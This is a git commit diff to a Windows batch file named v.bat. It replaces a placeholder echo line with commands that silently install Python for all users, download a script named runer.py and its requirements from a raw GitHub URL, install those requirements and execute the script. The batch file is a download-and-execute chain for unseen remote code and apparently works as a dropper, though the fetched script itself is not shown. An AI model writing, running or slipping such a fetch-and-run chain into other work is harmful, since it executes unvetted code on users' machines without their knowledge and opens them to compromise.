e881d778e367579e147c9e32f10c19699035ba68
MundoCoRobiBundo <114348080+MundoCoRobiBundo@users.noreply.github.com>
2022-09-26 18:54:59 +0200

    Update v.bat

--- v.bat
+++ v.bat
@@ -1,1 +1,10 @@
-echo uwu
+curl https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe -O
+python-3.10.7-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+
+
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/runer.py -O
+curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
+
+pip install -r requirements.txt
+
+python runer.py
